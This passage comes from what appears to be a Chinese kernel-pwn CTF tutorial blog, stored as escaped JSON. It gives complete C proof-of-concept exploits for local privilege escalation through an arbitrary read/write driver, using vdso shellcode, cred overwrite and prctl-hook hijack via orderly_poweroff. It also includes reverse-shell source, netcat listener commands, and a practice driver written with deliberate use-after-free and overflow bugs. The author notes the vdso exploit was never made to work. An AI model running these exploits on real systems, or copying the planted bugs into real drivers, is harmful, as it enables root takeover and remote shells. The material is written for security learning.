(!strcmp(buf+gettimeofday_str_offset,\"gettimeofday\")) {\n            printf(\"[+]find vdso.so!!\\n\");\n            vdso_addr = addr;\n            printf(\"[+]vdso in kernel addr=0x%lx\\n\",vdso_addr);\n            break;\n        }\n    }\n}\n\n//获取vdso里的字符串\"gettimeofday\"相对vdso.so的偏移\nint get_gettimeofday_str_offset() {\n    //获取当前程序的vdso.so加载地址0x7ffxxxxxxxx\n    size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\n    char* name = \"gettimeofday\";\n    if (!vdso_addr) {\n        printf(\"[-]error get name's offset\\n\");\n    }\n    //仅需要搜索1页大小即可，因为vdso映射就一页0x1000\n    size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\n    if (name_addr < 0) {\n        printf(\"[-]error get name's offset\\n\");\n    }\n    return name_addr - vdso_addr;\n}\n```\n\n之后得到具体的地址\n\n![image-20211020150723942](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150724.png)\n\n那么最终的gettimeofday相对于vmlinux基地址就是\n\n```\ngettimeofday_addr = 0xffffffff81e04b20+0xb20\n```\n\n#### (3)任意写劫持gettimeofday\n\n最终利用任意写，将gettimeofday函数的内容改为我们的shellcode即可\n\n#### POC\n\n```c\n// gcc -static exp.c -o exp\n// ffffffff810a78d0 T SyS_gettimeofday\n// ffffffff810a78d0 T sys_gettimeofday\n// ffffffff810b08f0 T do_gettimeofday\n// ffffffff810c7350 T compat_SyS_gettimeofday\n// ffffffff810c7350 T compat_sys_gettimeofday\n//0x13d\n#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <sys/ioctl.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/prctl.h>\n#include <sys/time.h>\n#include <sys/auxv.h>\n\n#define GETTIMEOFDAY_FUN 0xB20\n\nstruct arbWriteNote\n{\n    ssize_t addr;\n    ssize_t len;\n    char* data;\n};\nstruct arbWriteNote arbWriteObj;\n\n\n//用于反弹shell的shellcode，127.0.0.1:3333\n//或者在比赛中可以直接写类似Orw打开flag的shellcode\nchar shellcode[]=\"\\x90\\x53\\x48\\x31\\xC0\\xB0\\x66\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xC3\\x75\\x0F\\x48\\x31\\xC0\\xB0\\x39\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xD8\\x74\\x09\\x5B\\x48\\x31\\xC0\\xB0\\x60\\x0F\\x05\\xC3\\x48\\x31\\xD2\\x6A\\x01\\x5E\\x6A\\x02\\x5F\\x6A\\x29\\x58\\x0F\\x05\\x48\\x97\\x50\\x48\\xB9\\xFD\\xFF\\xF2\\xFA\\x80\\xFF\\xFF\\xFE\\x48\\xF7\\xD1\\x51\\x48\\x89\\xE6\\x6A\\x10\\x5A\\x6A\\x2A\\x58\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xD8\\x74\\x07\\x48\\x31\\xC0\\xB0\\xE7\\x0F\\x05\\x90\\x6A\\x03\\x5E\\x6A\\x21\\x58\\x48\\xFF\\xCE\\x0F\\x05\\x75\\xF6\\x48\\x31\\xC0\\x50\\x48\\xBB\\xD0\\x9D\\x96\\x91\\xD0\\x8C\\x97\\xFF\\x48\\xF7\\xD3\\x53\\x48\\x89\\xE7\\x50\\x57\\x48\\x89\\xE6\\x48\\x31\\xD2\\xB0\\x3B\\x0F\\x05\\x48\\x31\\xC0\\xB0\\xE7\\x0F\\x05\";\n\n\n//open dev\nint openDev(char* pos);\nint get_gettimeofday_str_offset();\n\nint main(int argc, char *argv[])\n{\n    setvbuf(stdin,0,2,0);\n    setvbuf(stdout,0,2,0);\n    setvbuf(stderr,0,2,0); \n\n    int devFD;\n    int addrFD;\n    unsigned long memOffset;\n    pthread_t thread;\n    \n    //open Dev\n    char* pos = \"/dev/arbWriteModule\";\n    devFD = openDev(pos);\n\n\n\n   char *buf = (char *)calloc(1,0x1000);\n\n\n   int gettimeofday_str_offset = get_gettimeofday_str_offset();\n   printf(\"gettimeofday str in vdso.so offset=0x%x\\n\",gettimeofday_str_offset);\n   size_t vdso_addr = -1;\n   for (size_t addr=0xffffffff80000000;addr < 0xffffffffffffefff;addr += 0x1000) {\n      //读取一页数据\n      arbitrary_read(devFD,0x1000,buf,addr);\n      //如果在对应的偏移处，正好是这个字符串，那么我们就能确定当前就是vdso的地址\n      //之所以能确定，是因为我们每次读取了0x1000字节数据，也就是1页，而vdso的映射也只是1页\n      if (!strcmp(buf+gettimeofday_str_offset,\"gettimeofday\")) {\n         printf(\"[+]find vdso.so!!\\n\");\n         vdso_addr = addr;\n         printf(\"[+]vdso in kernel addr=0x%lx\\n\",vdso_addr);\n         break;\n      }\n   }\n   if (vdso_addr == -1) {\n      printf(\"[-]can't find vdso.so!!\\n\");\n   }\n   size_t gettimeofday_addr = vdso_addr + GETTIMEOFDAY_FUN;\n   printf(\"[+]gettimeofday function in kernel addr=0x%lx\\n\",gettimeofday_addr);\n   //将gettimeofday处写入我们的shellcode，因为写操作在内核驱动里完成，内核可以读写执行vdso\n   //用户只能读和执行vdso\n   arbitrary_write(devFD,strlen(shellcode),shellcode,gettimeofday_addr);\n   sleep(1);\n   printf(\"[+]open a shell\\n\");\n   system(\"nc -lvnp 3333\");\n   return 0;\n}\n\n\nint openDev(char* pos){\n    int devFD;\n    printf(\"[+] Open %s...\\n\",pos);\n    if ((devFD = open(pos, O_RDWR)) < 0) {\n        printf(\"    Can't open device file: %s\\n\",pos);\n        exit(1);\n    }\n    return devFD;\n}\n\n\n//获取vdso里的字符串\"gettimeofday\"相对vdso.so的偏移\nint get_gettimeofday_str_offset() {\n   //获取当前程序的vdso.so加载地址0x7ffxxxxxxxx\n   size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\n   char* name = \"gettimeofday\";\n   if (!vdso_addr) {\n      printf(\"[-]error get name's offset\\n\");\n   }\n   //仅需要搜索1页大小即可，因为vdso映射就一页0x1000\n   size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\n   if (name_addr < 0) {\n      printf(\"[-]error get name's offset\\n\");\n   }\n   return name_addr - vdso_addr;\n}\n\nvoid arbitrary_read(int devFD,int len,char *buf,size_t addr)\n{\n    arbWriteObj.len = len;\n    arbWriteObj.data = buf;\n    arbWriteObj.addr = addr;\n    ioctl(devFD,111,&arbWriteObj);\n}\n\nvoid arbitrary_write(int devFD,int len,char *buf,size_t addr)\n{\n    arbWriteObj.len = len;\n    arbWriteObj.data = buf;\n    arbWriteObj.addr = addr;\n    ioctl(devFD,222,&arbWriteObj);\n}\n```\n\n参考：\n\n[(15条消息) linux kernel pwn学习之劫持vdso_seaaseesa的博客-CSDN博客](https://blog.csdn.net/seaaseesa/article/details/104694219?ops_request_misc=%7B%22request%5Fid%22%3A%22163469082516780357227209%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=163469082516780357227209&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-7-104694219.pc_v2_rank_blog_default&utm_term=kernel&spm=1018.2226.3001.4450)\n\n还有bsauce师傅的简书：https://www.jianshu.com/p/07994f8b2bb0\n\n### 2.劫持cred结构体\n\n#### (1)前置知识\n\n这个没啥好讲的，就是覆盖uig和gid为零蛋就行，唯一需要的就是寻找cred的地址。\n\n\n\n#### (2)寻找地址\n\n##### ①利用prctl函数\n\ntask_srtuct结构体是每个进程都会创建的一个结构体，保存当前进程的很多内容，其中就包括当前进程的cred结构体指针。\n\n```c\n//version 4.4.72\n\nstruct task_struct {\n    //............................................\n/* process credentials */\n\tconst struct cred __rcu *ptracer_cred; /* Tracer's credentials at attach */\n\tconst struct cred __rcu *real_cred; /* objective and real subjective task\n\t\t\t\t\t * credentials (COW) */\n\tconst struct cred __rcu *cred;\t/* effective (overridable) subjective task\n\t\t\t\t\t * credentials (COW) */\n\tchar comm[TASK_COMM_LEN]; /* executable name excluding path\n\t\t\t\t     - access with [gs]et_task_comm (which lock\n\t\t\t\t       it with task_lock())\n\t\t\t\t     - initialized normally by setup_new_exec */\n\t//............................................\n}\n```\n\n给出的题目编译在4.4.72内核下。\n\n也就是可以将comm[TASK_COMM_LEN]设置为指定的字符串，相当于打个标记，不过不同版本中可能有所不同，不如最新版本V5.14.13的Linux内核就有所不同，其中还加了一个key结构体指针：\n\n```c\n//version 5.14.13\n\nstruct task_struct {\n    //............................................\n#ifdef CONFIG_THREAD_INFO_IN_TASK\n\t/*\n\t * For reasons of header soup (see current_thread_info()), this\n\t * must be the first element of task_struct.\n\t */\n\tstru/* Tracer's credentials at attach: */\n\tconst struct cred __rcu\t\t*ptracer_cred;\n\n\t/* Objective and real subjective task credentials (COW): */\n\tconst struct cred __rcu\t\t*real_cred;\n\t\n\t/* Effective (overridable) subjective task credentials (COW): */\n\tconst struct cred __rcu\t\t*cred;\n\n#ifdef CONFIG_KEYS\n\t/* Cached requested key. */\n\tstruct key\t\t\t*cached_requested_key;\n#endif\n\n\t/*\n\t * executable name, excluding path.\n\t *\n\t * - normally initialized setup_new_exec()\n\t * - access it with [gs]et_task_comm()\n\t * - lock it with task_lock()\n\t */\n\tchar\t\t\t\tcomm[TASK_COMM_LEN];\n\t//............................................\n\n}\n```\n\n然后就可以利用prctl函数的PR_SET_NAME功能来设置task_struct结构体中的comm[TASK_COMM_LEN]成员。\n\n```c\nchar target[16];\nstrcpy(target,\"tryToFindPIG007\");\nprctl(PR_SET_NAME,target);\n```\n\n##### ②内存搜索定位\n\n通过内存搜索，比对我们输入的标记字符串，可以定位comm[TASK_COMM_LEN]成员地址，比如设置标记字符串为\"tryToFindPIG007\":\n\n![image-20211020162844474](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020162844.png)\n\n![image-20211020162934065](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020162934.png)\n\n![image-20211020163051697](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020163051.png)\n\n可以查看当前Cred结构中的内容：\n\n![image-20211020163136129](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020163136.png)\n\n```c\n//search target chr\nchar *buf = (char *)calloc(1,0x1000);\nputs(\"[+] we can read and write any memory\");\nfor(;addr<0xffffc80000000000;addr+=0x1000){\n    arbitrary_read(devFD,0x1000,buf,addr);\n    result=memmem(buf,0x1000,target,16);\n    if (result){\n        printf(\"result:%p\\n\",result);\n        cred= * (size_t *)(result-0x8);\n        real_cred= *(size_t *)(result-0x10);\n        // if ((cred||0xff00000000000000) && (real_cred == cred))\n        // {\n        target_addr=addr+result-(int)(buf);\n        printf(\"[+]found task_struct 0x%lx\\n\",target_addr);\n        printf(\"[+]found cred 0x%lx\\n\",real_cred);\n        break;\n        // }\n    }\n}\n```\n\n##### ③任意写劫持cred\n\n这个就不多说了，获取到cred地址之后直接写就行了\n\n#### POC\n\n```c\n// gcc -static exp.c -o exp\n#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <sys/ioctl.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/prctl.h>\n#include <sys/time.h>\n#include <sys/auxv.h>\n\n\nstruct arbWriteNote\n{\n    ssize_t addr;\n    ssize_t len;\n    char* data;\n};\nstruct arbWriteNote arbWriteObj;\n\n\n\n//open dev\nint openDev(char* pos);\n\nint main(int argc, char *argv[])\n{\n    setvbuf(stdin,0,2,0);\n    setvbuf(stdout,0,2,0);\n    setvbuf(stderr,0,2,0); \n\n    int devFD;\n    int addrFD;\n    unsigned long memOffset;\n    size_t addr=0xffff880000000000;\n    size_t cred=0;\n    size_t real_cred=0;\n    size_t target_addr;\n    size_t result=0;\n    char root_cred[28] = {0};\n\n    //set comm[TASK_COMM_LEN]\n    char target[16];\n    strcpy(target,\"tryToFindPIG007\");\n    prctl(PR_SET_NAME,target);\n\n    //open Dev\n    char* pos = \"/dev/arbWriteModule\";\n    devFD = openDev(pos);\n\n    //search target chr\n    char *buf = (char *)calloc(1,0x1000);\n    puts(\"[+] we can read and write any memory\");\n    for(;addr<0xffffc80000000000;addr+=0x1000){\n        arbitrary_read(devFD,0x1000,buf,addr);\n        result=memmem(buf,0x1000,target,16);\n        if (result){\n            printf(\"result:%p\\n\",result);\n            cred= * (size_t *)(result-0x8);\n            real_cred= *(size_t *)(result-0x10);\n            // if ((cred||0xff00000000000000) && (real_cred == cred))\n            // {\n            target_addr=addr+result-(int)(buf);\n            printf(\"[+]found task_struct 0x%lx\\n\",target_addr);\n            printf(\"[+]found cred 0x%lx\\n\",real_cred);\n            break;\n            // }\n        }\n    }\n    if (result==0)\n    {\n        puts(\"not found , try again \");\n        exit(-1);\n    }\n\n    arbitrary_write(devFD,28,root_cred,real_cred);\n\n    if (getuid()==0){\n        printf(\"[+]now you are r00t,enjoy ur shell\\n\");\n        system(\"/bin/sh\");\n    }\n    else\n    {\n        puts(\"[-] there must be something error ... \");\n        exit(-1);\n    }\n\n\n\n   return 0;\n}\n\n\nint openDev(char* pos){\n    int devFD;\n    printf(\"[+] Open %s...\\n\",pos);\n    if ((devFD = open(pos, O_RDWR)) < 0) {\n        printf(\"    Can't open device file: %s\\n\",pos);\n        exit(1);\n    }\n    return devFD;\n}\n\n\n\nvoid arbitrary_read(int devFD,int len,char *buf,size_t addr)\n{\n    arbWriteObj.len = len;\n    arbWriteObj.data = buf;\n    arbWriteObj.addr = addr;\n    ioctl(devFD,111,&arbWriteObj);\n}\n\nvoid arbitrary_write(int devFD,int len,char *buf,size_t addr)\n{\n    arbWriteObj.len = len;\n    arbWriteObj.data = buf;\n    arbWriteObj.addr = addr;\n    ioctl(devFD,222,&arbWriteObj);\n}\n\n```\n\n#### ▲注意事项\n\n不过这个如果不加判断 `if ((cred||0xff00000000000000) && (real_cred == cred))`搜索出来的cred可能就不是当前进程，具有一定概率性，具体原因不知，可能是搜索到了用户进程下的字符串？\n\n![image-20211020165201267](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020165201.png)\n\n\n\n### 3.劫持prctl函数\n\n#### (1)函数调用链\n\n`prctl`->`security_task_prctl`->`*prctl_hook`\n\n\n\n`orderly_poweroff`->`__orderly_poweroff`->`run_cmd(poweroff_cmd)`-> `call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)`\n\n#### (2)前置知识\n\n![image-20211021000903293](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021000904.png)\n\n原本capability_hooks+440存放的是cap_task_prctl的地址\n\n![image-20211021001258001](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021001258.png)\n\n但是经过我们的劫持之后存放的是orderly_poweroff的地址\n\n![image-20211021001355490](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021001355.png)\n\n之前讲的prctl_hook指的就是capability_hooks+440。\n\n这样劫持之后我们就能调用到orderly_poweroff函数了。\n\n而orderly_poweroff函数中会调用实际__orderly_poweroff函数，有如下代码\n\n```c\n//version 4.4.72\nstatic int __orderly_poweroff(bool force)\n{\n\tint ret;\n\n\tret = run_cmd(poweroff_cmd);\n\n\tif (ret && force) {\n\t\tpr_warn(\"Failed to start orderly shutdown: forcing the issue\\n\");\n\n\t\t/*\n\t\t * I guess this should try to kick off some daemon to sync and\n\t\t * poweroff asap.  Or not even bother syncing if we're doing an\n\t\t * emergency shutdown?\n\t\t */\n\t\temergency_sync();\n\t\tkernel_power_off();\n\t}\n\n\treturn ret;\n}\n```\n\n这里就调用到run_cmd(poweroff_cmd)，而run_cmd函数有如下代码\n\n```c\n//version 4.4.72\nstatic int run_cmd(const char *cmd)\n{\n\tchar **argv;\n\tstatic char *envp[] = {\n\t\t\"HOME=/\",\n\t\t\"PATH=/sbin:/bin:/usr/sbin:/usr/bin\",\n\t\tNULL\n\t};\n\tint ret;\n\targv = argv_split(GFP_KERNEL, cmd, NULL);\n\tif (argv) {\n\t\tret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\n\t\targv_free(argv);\n\t} else {\n\t\tret = -ENOMEM;\n\t}\n\n\treturn ret;\n}\n```\n\n这里就调用到call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)，这里的参数rdi中就是\n\npoweroff_cmd。所以如果我们可以劫持poweroff_cmd为我们的程序名字字符串，那么就可以调用call_usermodehelpe函数来启动我们的程序。而poweroff_cmd是一个全局变量，可以直接获取地址进行修改。\n\n![image-20211021002640262](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021002640.png)\n\n而call_usermodehelpe函数启动程序时是以root权限启动的，所以如果我们的程序运行/bin/sh且以root权限启动，那么就完成了提权。\n\n#### (3)获取地址\n\n##### ①prctl_hook\n\n可以通过编写一个小程序，然后给`security_task_prctl`函数下断点，运行到`call QWORD PTR[rbx+0x18]`即可看到对应的rbx+0x18上存放的地址，将其修改为`orderly_poweroff`函数即可。\n\n##### ②poweroff_cmd、orderly_poweroff\n\n可以直接使用nm命令来获取，或者直接进入gdb打印即可。\n\n![image-20211021105456058](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021105503.png)\n\n此外orderly_poweroff也是一样的获取。如果无法查到，那么可以启动qemu，先设置为root权限后\n\n`cat /proc/kallsyms | grep \"orderly_poweroff\"`即可，或者编译一个对应版本的内核进行查询。\n\n![image-20211021105603666](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021105603.png)\n\n▲最后fork一个子进程来触发反弹shell即可\n\n#### POC\n\n```c\n// gcc -static exp.c -o exp\n\n//ffffffff812adb90 T security_task_prctl\n\n\n#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <sys/ioctl.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/prctl.h>\n#include <sys/time.h>\n#include <sys/auxv.h>\n\n\n//poweroff字符串的偏移\n#define POWEROFF_CMD 0xe39c40\n//orderly_poweroff函数的偏移\n#define ORDERLY_POWEROFF 0x070060\n//prctl_hook的偏移\n#define PRCTL_HOOK 0xe7c7d8;\n\n\nstruct arbWriteNote\n{\n    ssize_t addr;\n    ssize_t len;\n    char* data;\n};\nstruct arbWriteNote arbWriteObj;\n\n\n//open dev\nint openDev(char* pos);\nint get_gettimeofday_str_offset();\n\nint main(int argc, char *argv[])\n{\n    setvbuf(stdin,0,2,0);\n    setvbuf(stdout,0,2,0);\n    setvbuf(stderr,0,2,0); \n\n    int devFD;\n    \n    //open Dev\n    char* pos = \"/dev/arbWriteModule\";\n    devFD = openDev(pos);\n\n\n    // //set comm[TASK_COMM_LEN]\n    // char target[16];\n    // strcpy(target,\"tryToFindPIG007\");\n    // prctl(PR_SET_NAME,target);\n\n\n   char *buf = (char *)calloc(1,0x1000);\n\n\n   int gettimeofday_str_offset = get_gettimeofday_str_offset();\n   printf(\"gettimeofday str in vdso.so offset=0x%x\\n\",gettimeofday_str_offset);\n   size_t vdso_addr = -1;\n   for (size_t addr=0xffffffff80000000;addr < 0xffffffffffffefff;addr += 0x1000) {\n      //读取一页数据\n      arbitrary_read(devFD,0x1000,buf,addr);\n      //如果在对应的偏移处，正好是这个字符串，那么我们就能确定当前就是vdso的地址\n      //之所以能确定，是因为我们每次读取了0x1000字节数据，也就是1页，而vdso的映射也只是1页\n      if (!strcmp(buf+gettimeofday_str_offset,\"gettimeofday\")) {\n         printf(\"[+]find vdso.so!!\\n\");\n         vdso_addr = addr;\n         printf(\"[+]vdso in kernel addr=0x%lx\\n\",vdso_addr);\n         break;\n      }\n   }\n   if (vdso_addr == -1) {\n      printf(\"[-]can't find vdso.so!!\\n\");\n   }\n\n    //计算出kernel基地址\n    size_t kernel_base = vdso_addr & 0xffffffffff000000;\n    printf(\"[+]kernel_base=0x%lx\\n\",kernel_base);\n    size_t poweroff_cmd_addr = kernel_base + POWEROFF_CMD;\n    printf(\"[+]poweroff_cmd_addr=0x%lx\\n\",poweroff_cmd_addr);\n    size_t orderly_poweroff_addr = kernel_base + ORDERLY_POWEROFF;\n    printf(\"[+]orderly_poweroff_addr=0x%lx\\n\",orderly_poweroff_addr);\n    size_t prctl_hook_addr = kernel_base + PRCTL_HOOK;\n    printf(\"[+]prctl_hook_addr=0x%lx\\n\",prctl_hook_addr);\n    //反弹shell，执行的二进制文件，由call_usermodehelper来执行，自带root\n    char reverse_command[] = \"/reverse_shell\";\n    //修改poweroff_cmd_addr处的字符串为我们需要执行的二进制文件的路径\n    arbitrary_write(devFD,strlen(reverse_command),reverse_command,poweroff_cmd_addr);\n    //hijack prctl，使得task_prctl指向orderly_poweroff函数\n    arbitrary_write(devFD,0x8,&orderly_poweroff_addr,prctl_hook_addr);\n    if (fork() == 0) { //fork一个子进程，来触发shell的反弹\n        prctl(0,0);\n        exit(-1);\n    } else {\n        printf(\"[+]open a shell\\n\");\n        system(\"nc -lvnp 7777\");\n    }\n\n   return 0;\n}\n\n\nint openDev(char* pos){\n    int devFD;\n    printf(\"[+] Open %s...\\n\",pos);\n    if ((devFD = open(pos, O_RDWR)) < 0) {\n        printf(\"    Can't open device file: %s\\n\",pos);\n        exit(1);\n    }\n    return devFD;\n}\n\n\n//获取vdso里的字符串\"gettimeofday\"相对vdso.so的偏移\nint get_gettimeofday_str_offset() {\n   //获取当前程序的vdso.so加载地址0x7ffxxxxxxxx\n   size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\n   char* name = \"gettimeofday\";\n   if (!vdso_addr) {\n      printf(\"[-]error get name's offset\\n\");\n   }\n   //仅需要搜索1页大小即可，因为vdso映射就一页0x1000\n   size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\n   if (name_addr < 0) {\n      printf(\"[-]error get name's offset\\n\");\n   }\n   return name_addr - vdso_addr;\n}\n\nvoid arbitrary_read(int devFD,int len,char *buf,size_t addr)\n{\n    arbWriteObj.len = len;\n    arbWriteObj.data = buf;\n    arbWriteObj.addr = addr;\n    ioctl(devFD,111,&arbWriteObj);\n}\n\nvoid arbitrary_write(int devFD,int len,char *buf,size_t addr)\n{\n    arbWriteObj.len = len;\n    arbWriteObj.data = buf;\n    arbWriteObj.addr = addr;\n    ioctl(devFD,222,&arbWriteObj);\n}\n```\n\n#### 反弹Shell\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <string.h>\n#include <netdb.h>\n#include <sys/types.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n\nint main(int argc,char *argv[])\n{\n    //system(\"chmod 777 /flag\");\n    \n\n    int sockfd,numbytes;\n    char buf[BUFSIZ];\n    struct sockaddr_in their_addr;\n    printf(\"break!\");\n    while((sockfd = socket(AF_INET,SOCK_STREAM,0)) == -1);\n    printf(\"We get the sockfd~\\n\");\n    their_addr.sin_family = AF_INET;\n    their_addr.sin_port = htons(7777);\n    their_addr.sin_addr.s_addr=inet_addr(\"127.0.0.1\");\n    bzero(&(their_addr.sin_zero), 8);\n    \n    while(connect(sockfd,(struct sockaddr*)&their_addr,sizeof(struct sockaddr)) == -1);\n    dup2(sockfd,0);\n    dup2(sockfd,1);\n    dup2(sockfd,2);\n    system(\"/bin/sh\");\n    \n    return 0;\n\n}\n```\n\n或者直接`system(\"chmod 777 /flag\");`也是获取flag的一种方式。\n\n▲vdso的劫持一直没有复现成功过，明明已经劫持gettimeofday函数的内容为shellcode，然后也挂载了循环调用gettimeofday的程序，但是就是运行不了shellcode。\n\n\n\n参考：\n\n[Kernel Pwn 学习之路 - 番外 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/204319#h3-12)\n\nhttps://www.jianshu.com/p/07994f8b2bb0\n\nhttps://blog.csdn.net/seaaseesa/article/details/104695399\n\n","tags":["pwnKernel"],"categories":["pwnKernel"]},{"title":"pwnKernel从0开始(三)","url":"/2021/09/06/Kernel从0开始(三)/","content":"\n\n\n# 前言\n\n这里就尝试用堆来解题，由于kernel的解法多种多样，这里我们从最简单的UAF入手\n\n给出自己设计的堆题目，存在很多的漏洞，read越界读，edit越界写，UAF，Double Free等：\n\n```c\n#include <linux/module.h>\n#include <linux/version.h>\n#include <linux/kernel.h>\n#include <linux/types.h>\n#include <linux/kdev_t.h>\n#include <linux/fs.h>\n#include <linux/device.h>\n#include <linux/cdev.h>\n#include <asm/uaccess.h>\n#include <linux/slab.h>\n\n//设备驱动常用变量\n//static char *buffer_var = NULL;\nstatic char *buffer_var = NULL;\nstatic struct class *devClass; // Global variable for the device class\nstatic struct cdev cdev;\nstatic dev_t stack_dev_no;\n\n\nstruct note\n{\n    int idx;\n    int len;\n    char* data;\n};\n\n\n//static char* notelist[1000];\nstatic char* notelist[1000];\nstatic struct note* noteChunk;\nstatic int count = 0;\n\n\n\nstatic ssize_t stack_read(struct file *filp, const char __user *buf,\nsize_t len, loff_t *f_pos);\n\nstatic ssize_t stack_write(struct file *filp, const char __user *buf,\nsize_t len, loff_t *f_pos);\n\nstatic long stack_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);\n\nstatic int stack_open(struct inode *i, struct file *f);\n\nstatic int stack_close(struct inode *i, struct file *f);\n\n\n\nstatic struct file_operations stack_fops =\n        {\n                .owner = THIS_MODULE,\n                .open = stack_open,\n                .release = stack_close,\n                .write = stack_write,\n                .read = stack_read,\n                .unlocked_ioctl = stack_ioctl\n        };\n\n// 设备驱动模块加载函数\nstatic int __init stack_init(void)\n{\n    printk(KERN_INFO \"[i] Module stack registered\");\n    if (alloc_chrdev_region(&stack_dev_no, 0, 1, \"stack\") < 0)\n    {\n        return -1;\n    }\n    if ((devClass = class_create(THIS_MODULE, \"chardrv\")) == NULL)\n    {\n        unregister_chrdev_region(stack_dev_no, 1);\n        return -1;\n    }\n    if (device_create(devClass, NULL, stack_dev_no, NULL, \"stack\") == NULL)\n    {\n        printk(KERN_INFO \"[i] Module stack error\");\n        class_destroy(devClass);\n        unregister_chrdev_region(stack_dev_no, 1);\n        return -1;\n    }\n    cdev_init(&cdev, &stack_fops);\n    if (cdev_add(&cdev, stack_dev_no, 1) == -1)\n    {\n        device_destroy(devClass, stack_dev_no);\n        class_destroy(devClass);\n        unregister_chrdev_region(stack_dev_no, 1);\n        return -1;\n    }\n\n    printk(KERN_INFO \"[i] <Major, Minor>: <%d, %d>\\n\", MAJOR(stack_dev_no), MINOR(stack_dev_no));\n    return 0;\n}\n\n// 设备驱动模块卸载函数\nstatic void __exit stack_exit(void)\n{\n    // 释放占用的设备号\n    unregister_chrdev_region(stack_dev_no, 1);\n    cdev_del(&cdev);\n}\n\n\n// 读设备\nssize_t stack_read(struct file *filp, const char __user *buf,\nsize_t len, loff_t *f_pos)\n{\n    printk(KERN_INFO \"Stack_read function\" );\n    copy_to_user(buf,buffer_var,len);\n}\n\n// 写设备\nssize_t stack_write(struct file *filp, const char __user *buf,\nsize_t len, loff_t *f_pos)  //buffer overflow\n{\n    printk(KERN_INFO \"Stack_write function\" );\n    copy_from_user(buffer_var, buf, len);\n    printk(\"[i] Module stack write: %s\\n\",buffer_var);\n    return len;\n}\n\n\n\n// ioctl函数命令控制\nlong stack_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n    char* chunk = NULL;\n    int retval = 0;\n    printk(KERN_INFO \"Ioctl Get!\\n\");\n    printk(\"notelist_addr:0x%llx\\n\",&notelist[0]);\n    switch (cmd) {\n\n        case 1://add\n            //noteChunk = (char *)kmalloc(sizeof(struct Note),GFP_KERNEL);\n            //copy_from_user(noteChunk, arg, sizeof(struct Note));\n\n            printk(\"Kernel Add function!---001\\n\");\n            noteChunk = (struct Note*)arg;\n            chunk = (char *)kmalloc(noteChunk->len,GFP_KERNEL);\n            printk(\"chunk_addr:0x%llx\\n\",chunk);\n            if (!chunk)\n            {\n                printk(\"Alloca Error\\n\");\n                return 0;\n            }\n            memcpy(chunk, noteChunk->data,noteChunk->len);\n            notelist[count] = chunk;\n            chunk = NULL;\n            count ++;\n            printk(\"Add Success!\\n\");\n            break;\n\n        case 888: //free without clean point and data\n            printk(\"Kernel Free function!---888\\n\");\n            noteChunk = (struct Note*)arg;\n            printk(\"notelist:0x%llx\\n\",notelist[noteChunk->idx]);\n            if (notelist[noteChunk->idx])\n            {\n                kfree(notelist[noteChunk->idx]);\n                //notelist[noteChunk->idx] = NULL;\n                printk(\"Free Success!\\n\");\n            }\n            else\n            {\n                printk(\"You can't free it!There is no chunk!\\n\");\n            }\n            break;\n\n        case 3://edit   //UAF and overflow\n            printk(\"Kernel Edit function!---003\\n\");\n            noteChunk = (struct Note*)arg;\n            if (notelist[noteChunk->idx])\n            {\n                memcpy(notelist[noteChunk->idx], noteChunk->data,noteChunk->len);\n                printk(\"Edit Success!\\n\");\n            }\n            else\n            {\n                printk(\"You can't edit it!There is no chunk!\\n\");\n            }\n            break;\n \n        case 4://read   //over read\n            printk(\"Kernel Read function!---004\\n\");\n            noteChunk = (struct Note*)arg;\n            if(notelist[noteChunk->idx]){\n                copy_to_user(noteChunk->data,notelist[noteChunk->idx],noteChunk->len);\n                printk(\"Read Success!\\n\");\n            }\n            break;\n\n        case 111: //Test add chunk\n            printk(\"Test add chunk!---111\\n\");\n            printk(KERN_INFO \"No buffer_var!Malloc now!\" );\n            buffer_var=(char*)kmalloc(0xa8,GFP_KERNEL);\n            printk(\"buffer_var:0x%llx\\n\",buffer_var);\n            break;\n\n        default:\n            retval = -1;\n            break;\n    }    \n\n    return 